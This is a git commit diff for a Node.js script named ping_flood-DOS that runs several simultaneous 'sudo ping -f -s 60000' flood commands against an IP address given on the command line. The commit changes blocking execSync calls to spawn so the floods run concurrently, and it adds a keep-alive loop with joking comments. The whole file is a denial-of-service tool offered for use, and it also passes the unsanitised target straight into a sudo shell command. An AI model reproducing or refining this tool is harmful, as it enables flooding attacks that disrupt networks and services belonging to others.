1178d247e81c760c3b9adb45467e492b3fa0f6f6
Aarón <netaru3@gmail.com>
2026-07-28 22:06:56 -0300

    Replace execSync with spawn for ping command

--- ping_flood-DOS/ping.js
+++ ping_flood-DOS/ping.js
@@ -1,15 +1,22 @@
 //imports
 
-import {execSync} from 'child_process'
 import yargs from 'yargs';
 import { hideBin } from 'yargs/helpers';
-
+import {spawn} from 'child_process'
 //declarations
+
 const yarg = yargs(hideBin(process.argv)).option("n",{default:5}).parse()
 let i=1
 let n=yarg.n
 const ip= yarg._[0]
 
 
+
 //code
-while(i<n){execSync(`sudo ping -f -s 60000 ${ip}`); ++i}
+while(i<n){spawn(`sudo ping -f -s 60000 ${ip}`); ++i}
+
+
+setInterval(() => {
+    //brother this loop is simply there to prevent the process from terminating.
+    //if you are reading this, bro you lost the game
+},1000);
